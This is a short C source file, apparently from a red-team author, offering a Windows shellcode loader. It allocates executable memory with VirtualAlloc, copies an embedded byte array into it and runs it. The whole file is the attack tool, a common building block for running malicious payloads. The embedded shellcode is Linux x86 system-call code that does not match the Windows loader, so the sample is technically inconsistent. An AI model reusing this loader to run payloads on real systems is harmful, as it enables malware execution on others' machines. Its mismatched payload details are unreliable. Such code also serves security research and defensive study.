#include <Windows.h>
#include <stdio.h>
#include <string.h>

// Project:     Shellcode Runner / Loader
// Author:      Piyusha Akash (0x3xp)
// GitHub:      https://github.com/0x3xp
// Website:     https://0x3xp.github.io
//
// Description:
// Professional-grade shellcode execution utility for security research 
// and Red Teaming operations.
//
// Compiling Instructions:
// [C]   gcc program.c -o program.exe
// [C++] g++ program.cpp -o program.ex

int main() {
	
		unsigned char shellcode[] = "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80";	//Shellcode
		
		void* execMem = VirtualAlloc(NULL,
									sizeof(shellcode),
									MEM_COMMIT | MEM_RESERVE,
									PAGE_EXECUTE_READWRITE);	//Memory allocation
									
		if(execMem == NULL) {
			printf("Memory allocation failed! %lu", GetLastError());
			return -1;
		}	//Condition check
		
		memcpy(execMem, shellcode, sizeof(shellcode));	//Copy shellcode to memory
		
		void (*shellExecFunc) () = (void (*)())execMem;
		shellExecFunc();	//Execute the shell code
		
		VirtualFree(execMem, 0, MEM_RELEASE);	//Memory cleanup
		
	return 0;

}
